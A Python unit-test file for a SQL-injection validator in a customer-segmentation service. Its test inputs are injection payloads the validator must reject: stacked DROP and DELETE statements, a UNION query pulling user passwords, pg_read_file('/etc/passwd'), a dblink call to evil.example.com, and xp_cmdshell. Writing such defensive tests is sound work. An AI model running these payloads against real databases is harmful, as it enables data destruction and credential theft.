"""Unit tests for core.utils.sql_safety -- the injection-safety validation
applied to CdpSegment.sql_rules / final_generated_sql, both at write time
(core/schemas/segmentation.py) and again immediately before every execution
(core/routers/segment_api.py).
"""

import unittest

from core.utils.sql_safety import validate_readonly_sql_statement, validate_sql_where_fragment


class ValidateSqlWhereFragmentTests(unittest.TestCase):
    def test_accepts_simple_comparison(self):
        self.assertEqual(validate_sql_where_fragment("predictive_clv > 1000"), "predictive_clv > 1000")

    def test_accepts_in_clause(self):
        fragment = "churn_risk_tier IN ('high', 'critical')"
        self.assertEqual(validate_sql_where_fragment(fragment), fragment)

    def test_accepts_interval_expression(self):
        fragment = "customer_since >= (CURRENT_DATE - INTERVAL '30 days')"
        self.assertEqual(validate_sql_where_fragment(fragment), fragment)

    def test_accepts_now_function(self):
        fragment = "last_activity_at < (now() - INTERVAL '90 days')"
        self.assertEqual(validate_sql_where_fragment(fragment), fragment)

    def test_accepts_multi_condition_fragment(self):
        fragment = (
            "last_activity_at < (now() - INTERVAL '30 days') "
            "AND last_activity_at > (now() - INTERVAL '180 days') "
            "AND churn_risk_tier IN ('medium', 'high', 'critical')"
        )
        self.assertEqual(validate_sql_where_fragment(fragment), fragment)

    def test_rejects_empty_string(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("")

    def test_rejects_none(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment(None)

    def test_rejects_statement_stacking_semicolon(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1; DROP TABLE cdp_master_profiles;")

    def test_rejects_sql_comment(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1 -- OR tenant_id = 'x'")

    def test_rejects_block_comment(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1 /* sneaky */ OR 1=1")

    def test_rejects_dml_keyword(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1); DELETE FROM sys_user WHERE (1=1")

    def test_rejects_ddl_keyword(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1) OR (DROP TABLE sys_tenant")

    def test_rejects_subquery_select(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("tenant_id IN (SELECT tenant_id FROM sys_tenant)")

    def test_rejects_union(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1 UNION SELECT * FROM sys_user")

    # -- Additional real-world SQL-injection attack patterns -------------

    def test_rejects_classic_tautology_stacked_query(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1' OR '1'='1'; --")

    def test_rejects_union_based_password_exfiltration(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment(
                "tenant_id = '1' UNION SELECT username, password FROM sys_user --"
            )

    def test_rejects_mysql_style_hash_comment(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("tenant_id = '1' OR 1=1 #")

    def test_rejects_boolean_blind_injection_via_dml(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (DROP TABLE x) END)")

    def test_rejects_time_based_blind_pg_sleep(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1 AND (SELECT pg_sleep(10))")

    def test_rejects_pg_sleep_without_select(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("pg_sleep(10) IS NOT NULL")

    def test_rejects_out_of_band_dblink(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("dblink_connect('host=evil.example.com') IS NOT NULL")

    def test_rejects_pg_read_file_local_file_disclosure(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("pg_read_file('/etc/passwd') IS NOT NULL")

    def test_rejects_pg_terminate_backend_dos(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("pg_terminate_backend(1) IS NOT NULL")

    def test_rejects_current_setting_privilege_probe(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("current_setting('is_superuser') = 'on'")

    def test_rejects_set_config_session_tampering(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("set_config('search_path', 'evil', false) IS NOT NULL")

    def test_rejects_sqlserver_style_xp_cmdshell(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1); EXEC xp_cmdshell('whoami'); --")

    def test_rejects_anonymous_code_block_do(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1) OR (DO $$ BEGIN PERFORM 1; END $$")

    def test_rejects_common_table_expression_injection(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1) OR 1=1) UNION (WITH x AS (SELECT 1) SELECT * FROM x")

    def test_rejects_stacked_transaction_control(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1); COMMIT; BEGIN")

    def test_rejects_case_insensitive_keyword_obfuscation(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1); DrOp TaBlE sys_tenant; --")

    def test_rejects_newline_obfuscated_keyword(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1)\nOR\n(DROP\nTABLE sys_tenant")

    def test_rejects_null_byte_smuggling(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1\x00; DROP TABLE sys_tenant")

    def test_rejects_other_control_characters(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1\x1b[31m OR 1=1")

    def test_rejects_unbalanced_parentheses_closing_early(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("tenant_id = 'x') OR ('1'='1")

    def test_rejects_oversized_payload(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("tenant_id = '1' OR " + "1" * 5000 + "=1")

    def test_rejects_grant_privilege_escalation(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1); GRANT ALL PRIVILEGES ON sys_user TO PUBLIC; --")

    def test_rejects_merge_statement(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("1=1); MERGE INTO sys_user USING x ON (1=1); --")

    def test_rejects_advisory_lock_dos(self):
        with self.assertRaises(ValueError):
            validate_sql_where_fragment("pg_advisory_lock(1) IS NOT NULL")


class ValidateReadonlySqlStatementTests(unittest.TestCase):
    def test_allows_select_from(self):
        sql = "SELECT master_profile_id FROM customer360.cdp_master_profiles WHERE tenant_id = :tenant_id"
        self.assertEqual(validate_readonly_sql_statement(sql), sql)

    def test_allows_none_and_empty(self):
        self.assertIsNone(validate_readonly_sql_statement(None))
        self.assertEqual(validate_readonly_sql_statement(""), "")

    def test_rejects_statement_stacking(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1; DROP TABLE cdp_segments;")

    def test_rejects_dml_keyword(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1 WHERE 1=1 OR (DELETE FROM sys_user)=1")

    # -- Additional real-world SQL-injection attack patterns -------------

    def test_rejects_sql_comment(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1 -- ; DROP TABLE cdp_segments")

    def test_rejects_hash_comment(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1 # DROP TABLE cdp_segments")

    def test_rejects_pg_read_file(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT pg_read_file('/etc/passwd')")

    def test_rejects_dblink(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT * FROM dblink('host=evil.example.com', 'SELECT 1') AS t(x int)")

    def test_rejects_xp_cmdshell(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1; EXEC xp_cmdshell('whoami')")

    def test_rejects_null_byte_smuggling(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1\x00; DROP TABLE cdp_segments")

    def test_rejects_oversized_payload(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1 WHERE " + "1" * 25000 + "=1")

    def test_rejects_stacked_transaction_control(self):
        with self.assertRaises(ValueError):
            validate_readonly_sql_statement("SELECT 1; COMMIT; BEGIN")


if __name__ == "__main__":
    unittest.main()
